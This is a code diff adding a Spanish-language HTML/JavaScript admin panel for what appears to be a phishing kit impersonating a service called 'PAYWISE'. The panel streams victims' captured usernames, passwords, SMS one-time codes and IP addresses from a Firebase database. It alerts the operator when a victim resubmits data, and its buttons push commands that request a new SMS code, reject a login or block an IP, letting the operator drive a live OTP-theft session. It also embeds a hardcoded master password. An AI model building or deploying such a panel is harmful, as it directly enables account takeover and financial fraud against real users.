@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>JS C0D3R - PANEL PAYWISE</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Firebase -->
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <!-- Google Fonts (Inter) -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #0a0a0a;
+            color: #e5e5e5;
+        }
+
+        /* Pantalla de autenticación */
+        #auth-screen { display: flex; }
+        #admin-panel { display: none; }
+
+        /* Estilos del Panel Principal */
+        .panel-header {
+            background-color: #0a0a0a;
+            border-bottom: 2px solid #4b5563;
+        }
+
+        .stats-box {
+            background-color: #111111;
+            border: 1px solid #374151;
+            border-radius: 0.375rem;
+            padding: 0.75rem 1rem;
+            min-width: 80px;
+            text-align: center;
+        }
+
+        .stats-label {
+            color: #9ca3af;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .stats-value {
+            color: #3b82f6;
+            font-size: 1.125rem;
+            font-weight: 700;
+        }
+
+        .stats-value.green { color: #10b981; }
+        .stats-value.red { color: #ef4444; }
+
+        .btn {
+            background-color: #1f2937;
+            border: 1px solid #4b5563;
+            border-radius: 0.375rem;
+            padding: 0.5rem 1rem;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: #e5e5e5;
+            transition: all 0.2s;
+        }
+
+        .btn:hover {
+            background-color: #374151;
+            border-color: #6b7280;
+        }
+
+        .btn-primary {
+            background-color: #db2777;
+            border-color: #db2777;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background-color: #be185d;
+            border-color: #be185d;
+        }
+
+        .table-header {
+            background-color: #111111;
+            border-bottom: 2px solid #4b5563;
+        }
+
+        .table-row {
+            background-color: #111111;
+            border-bottom: 1px solid #374151;
+            transition: background-color 0.2s;
+        }
+
+        .table-row:hover {
+            background-color: #1a1a1a;
+        }
+
+        .btn-sm {
+            padding: 0.25rem 0.5rem;
+            font-size: 0.75rem;
+            border-radius: 0.25rem;
+            font-weight: 600;
+        }
+
+        .btn-orange { background-color: #f59e0b; color: white; border: none; }
+        .btn-orange:hover { background-color: #d97706; }
+
+        .btn-orange-dark { background-color: #ea580c; color: white; border: none; }
+        .btn-orange-dark:hover { background-color: #c2410c; }
+
+        .btn-gray { background-color: #4b5563; color: white; border: none; }
+        .btn-gray:hover { background-color: #374151; }
+
+        .btn-purple { background-color: #8b5cf6; color: white; border: none; }
+        .btn-purple:hover { background-color: #7c3aed; }
+
+        .btn-red { background-color: #ef4444; color: white; border: none; }
+        .btn-red:hover { background-color: #dc2626; }
+
+        .text-blue { color: #3b82f6; }
+        .text-red { color: #ef4444; }
+        .text-yellow { color: #eab308; }
+        .text-green { color: #10b981; }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 0.5rem;
+        }
+        .status-dot.offline { background-color: #6b7280; }
+
+        /* Animaciones de alerta */
+        .sms-pulse td { animation: pulse-yellow 2s infinite; }
+        .reentry-pulse td { animation: pulse-red 1.5s infinite; }
+        @keyframes pulse-yellow {
+            0%, 100% { background-color: rgba(245, 158, 11, 0.2); }
+            50% { background-color: rgba(245, 158, 11, 0.4); }
+        }
+        @keyframes pulse-red {
+            0%, 100% { background-color: rgba(239, 68, 68, 0.2); }
+            50% { background-color: rgba(239, 68, 68, 0.4); }
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+    <!-- PANTALLA DE AUTENTICACIÓN -->
+    <div id="auth-screen" class="fixed inset-0 bg-slate-900 flex items-center justify-center z-[100]">
+        <div class="bg-white p-8 rounded-2xl shadow-2xl w-96 text-center">
+            <h2 class="text-2xl font-bold mb-6 text-gray-800">🔐 Acceso Master PAYWISE</h2>
+            <input type="password" id="admin-pass" placeholder="Contraseña" 
+                   class="w-full p-3 border border-gray-300 rounded-lg mb-4 focus:outline-none focus:ring-2 focus:ring-indigo-500">
+            <button onclick="verificarAcceso()" 
+                    class="w-full bg-indigo-600 text-white font-bold py-3 rounded-lg hover:bg-indigo-700 transition">
+                Acceder al Panel
+            </button>
+            <p id="auth-error" class="text-red-500 text-sm mt-3 hidden">Credencial Inválida</p>
+        </div>
+    </div>
+
+    <!-- PANEL PRINCIPAL -->
+    <div id="admin-panel" class="min-h-screen flex flex-col">
+        
+        <!-- HEADER / TOP BAR -->
+        <header class="panel-header py-4 px-6 sticky top-0 z-50">
+            <div class="max-w-7xl mx-auto flex flex-col md:flex-row justify-between items-center gap-4">
+                
+                <!-- Título -->
+                <div class="text-2xl font-bold tracking-wide">
+                    <span class="text-blue-500">PAYWISE</span>
+                    <span class="text-purple-500 ml-1">EN LINEA</span>
+                </div>
+
+                <!-- Botones de Estadísticas -->
+                <div class="flex flex-wrap justify-center gap-3">
+                    <div class="stats-box">
+                        <div class="stats-label">TOTAL:</div>
+                        <div id="total-count" class="stats-value">0</div>
+                    </div>
+                    <div class="stats-box">
+                        <div class="stats-label">LIVE:</div>
+                        <div id="live-count" class="stats-value green">0</div>
+                    </div>
+                    <div class="stats-box">
+                        <div class="stats-label">OFF:</div>
+                        <div id="off-count" class="stats-value">0</div>
+                    </div>
+                    <div class="stats-box">
+                        <div class="stats-label">IPs:</div>
+                        <div id="ips-count" class="stats-value">0</div>
+                    </div>
+                    <div class="stats-box">
+                        <div class="stats-label">BLQ:</div>
+                        <div id="blq-count" class="stats-value red">0</div>
+                    </div>
+                </div>
+
+                <!-- Botones de Acción -->
+                <div class="flex flex-wrap justify-center gap-2">
+                    <button onclick="borrarTodo()" class="btn btn-primary">LIMPIAR</button>
+                    <button onclick="cerrarSesion()" class="btn">SALIR</button>
+                </div>
+            </div>
+        </header>
+
+        <!-- CONTENIDO PRINCIPAL -->
+        <main class="flex-grow px-4 py-6">
+            <div class="max-w-7xl mx-auto">
+                
+                <!-- Tabla de Datos -->
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left border-collapse">
+                        <thead>
+                            <tr class="table-header text-sm uppercase">
+                                <th class="py-3 px-4 font-semibold text-gray-400 tracking-wider">Estado</th>
+                                <th class="py-3 px-4 font-semibold text-gray-400 tracking-wider">Página</th>
+                                <th class="py-3 px-4 font-semibold text-gray-400 tracking-wider">Usuario</th>
+                                <th class="py-3 px-4 font-semibold text-gray-400 tracking-wider">Contraseña</th>
+                                <th class="py-3 px-4 font-semibold text-gray-400 tracking-wider">Token</th>
+                                <th class="py-3 px-4 font-semibold text-gray-400 tracking-wider">IP</th>
+                                <th class="py-3 px-4 font-semibold text-gray-400 tracking-wider">Último</th>
+                                <th class="py-3 px-4 font-semibold text-gray-400 tracking-wider text-right">Acciones</th>
+                            </tr>
+                        </thead>
+                        <tbody id="users-table-body">
+                            <!-- Las filas de datos se insertarán aquí dinámicamente con JavaScript -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Sonido de notificación -->
+    <audio id="notif-sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
+
+    <script>
+        const CLAVE_MAESTRA = "Cabimas01"; 
+        const firebaseConfig = { databaseURL: "https://tucopedanm-default-rtdb.firebaseio.com/" };
+        
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        
+        let idsConocidos = new Set(); 
+        let ultimoSmsRegistrado = {}; 
+        let ultimaFechaLogin = {}; 
+        let primeraCarga = true;
+        let ipsUnicas = new Set();
+
+        // Lógica de Auto-Refresh (10 segundos)
+        let countTimer = 10;
+        setInterval(() => {
+            countTimer--;
+            document.getElementById('timer').innerText = countTimer;
+            if (countTimer <= 0) {
+                location.reload();
+            }
+        }, 1000);
+
+        function sonarAlerta() {
+            const sound = document.getElementById('notif-sound');
+            if (sound) {
+                sound.currentTime = 0;
+                sound.play().catch(() => {});
+            }
+        }
+
+        function verificarAcceso() {
+            const pass = document.getElementById('admin-pass').value;
+            if (pass === CLAVE_MAESTRA) {
+                sessionStorage.setItem('admin_auth', 'true');
+                mostrarPanel();
+            } else {
+                document.getElementById('auth-error').classList.remove('hidden');
+            }
+        }
+
+        function mostrarPanel() {
+            document.getElementById('auth-screen').style.display = 'none';
+            document.getElementById('admin-panel').style.display = 'flex';
+            iniciarEscuchaFirebase();
+        }
+
+        function cerrarSesion() {
+            sessionStorage.removeItem('admin_auth');
+            location.reload();
+        }
+
+        if (sessionStorage.getItem('admin_auth') === 'true') {
+            mostrarPanel();
+        }
+
+        function iniciarEscuchaFirebase() {
+            db.ref('logins').on('value', (snapshot) => {
+                const tbody = document.getElementById('users-table-body');
+                tbody.innerHTML = ''; // Limpiar tabla
+                
+                let totalCount = 0;
+                let liveCount = 0;
+                let offCount = 0;
+                ipsUnicas.clear();
+
+                snapshot.forEach((child) => {
+                    const id = child.key;
+                    const data = child.val();
+                    if (!data) return;
+                    
+                    totalCount++;
+                    ipsUnicas.add(data.ip);
+
+                    // --- DETECCIÓN DE EVENTOS ---
+                    let newRowClass = "table-row";
+                    let avisoReingresoHtml = "";
+
+                    // 1. Nuevo Usuario
+                    if (!idsConocidos.has(id)) {
+                        if (!primeraCarga) sonarAlerta();
+                        idsConocidos.add(id);
+                    }
+
+                    // 2. Nuevo SMS
+                    if (data.sms && ultimoSmsRegistrado[id] !== data.sms) {
+                        if (!primeraCarga) sonarAlerta();
+                        ultimoSmsRegistrado[id] = data.sms;
+                        newRowClass += " sms-pulse"; // Añadir clase de animación
+                    }
+                    
+                    // 3. Re-ingreso de credenciales
+                    if (ultimaFechaLogin[id] && ultimaFechaLogin[id] !== data.fecha) {
+                        avisoReingresoHtml = `
+                            <div class="mt-2 p-2 rounded border-2 border-red-500 reentry-pulse text-red-700 text-[10px] font-black text-center">
+                                ⚠️ EL USUARIO VOLVIÓ A ENVIAR DATOS
+                            </div>`;
+                        if (!primeraCarga) sonarAlerta();
+                        newRowClass += " reentry-pulse"; // Añadir clase de animación
+                    }
+                    ultimaFechaLogin[id] = data.fecha;
+
+                    // 4. Estado de actividad y conexión
+                    let estadoHtml = '';
+                    let isLive = data.online === true;
+                    if (isLive) {
+                        liveCount++;
+                        estadoHtml = `
+                            <span class="status-dot"></span>
+                            <span class="text-green-400 font-bold">LIVE</span>`;
+                    } else {
+                        offCount++;
+                        estadoHtml = `
+                            <span class="status-dot offline"></span>
+                            <span class="text-gray-400 font-bold">OFFLINE</span>`;
+                    }
+                    
+                    // 5. Token (SMS)
+                    let tokenHtml = `<div class="bg-gray-700 px-3 py-1 rounded text-xs text-gray-400">----</div>`;
+                    if (data.sms) {
+                        tokenHtml = `<div class="text-3xl font-black tracking-[0.5em] text-yellow-400">${data.sms}</div>`;
+                    }
+
+                    // 6. Cálculo de "Último" (tiempo desde el último login)
+                    let tiempoUltimo = "N/A";
+                    if (data.fecha) {
+                        const segundos = Math.floor((new Date() - new Date(data.fecha)) / 1000);
+                        if (segundos < 60) tiempoUltimo = `${segundos}s`;
+                        else if (segundos < 3600) tiempoUltimo = `${Math.floor(segundos / 60)}m`;
+                        else tiempoUltimo = `${Math.floor(segundos / 3600)}h`;
+                    }
+
+                    // Crear la fila de la tabla
+                    tbody.innerHTML += `
+                        <tr class="${newRowClass}">
+                            <td class="py-4 px-4">
+                                ${estadoHtml}
+                                ${avisoReingresoHtml}
+                            </td>
+                            <td class="py-4 px-4">
+                                <span class="text-yellow-500 font-mono">${data.pagina || 'CARGANDO.HTML'}</span>
+                            </td>
+                            <td class="py-4 px-4">
+                                <span class="text-blue-400 font-mono">${data.username}</span>
+                            </td>
+                            <td class="py-4 px-4">
+                                <span class="text-red-400 font-mono">${data.password}</span>
+                            </td>
+                            <td class="py-4 px-4">
+                                ${tokenHtml}
+                            </td>
+                            <td class="py-4 px-4">
+                                <span class="text-gray-400 font-mono">${data.ip || '0.0.0.0'}</span>
+                            </td>
+                            <td class="py-4 px-4">
+                                <span class="text-gray-400">${tiempoUltimo}</span>
+                            </td>
+                            <td class="py-4 px-4 text-right space-x-2">
+                                <button onclick="enviarOrden('${id}', 'pedir_codigo')" class="btn-sm btn-orange">SMS 1</button>
+                                <button onclick="enviarOrden('${id}', 'rechazar')" class="btn-sm btn-gray">RECHAZAR</button>
+                                <button onclick="enviarOrden('${id}', 'bloquear_ip')" class="btn-sm btn-purple">BLOQUEAR IP</button>
+                                <button onclick="eliminarUsuario('${id}')" class="btn-sm btn-red">ELIMINAR</button>
+                            </td>
+                        </tr>`;
+                });
+
+                // Actualizar contadores del header
+                document.getElementById('total-count').innerText = totalCount;
+                document.getElementById('live-count').innerText = liveCount;
+                document.getElementById('off-count').innerText = offCount;
+                document.getElementById('ips-count').innerText = ipsUnicas.size;
+                // El contador de BLQ necesitaría lógica adicional si lo guardas en la DB
+                
+                primeraCarga = false;
+            });
+        }
+
+        function enviarOrden(id, accion) {
+            if (accion === 'pedir_codigo') {
+                db.ref('logins/' + id).update({ 
+                    status: 'PENDIENTE_SMS',
+                    sms: null 
+                });
+            }
+            // Envía el comando a la 'rama' de comandos en Firebase
+            db.ref('comandos/' + id).set({ accion: accion });
+        }
+
+        function eliminarUsuario(id) {
+            if (confirm('¿Estás seguro de que quieres eliminar este usuario?')) {
+                db.ref('logins/' + id).remove();
+            }
+        }
+
+        function borrarTodo() {
+            if (confirm('⚠️ ¿ESTÁS SEGURO? Se borrarán todos los registros de la base de datos.')) {
+                db.ref('logins').remove();
+                db.ref('comandos').remove();
+                location.reload();
+            }
+        }
+    </script>
+</body>
+</html>
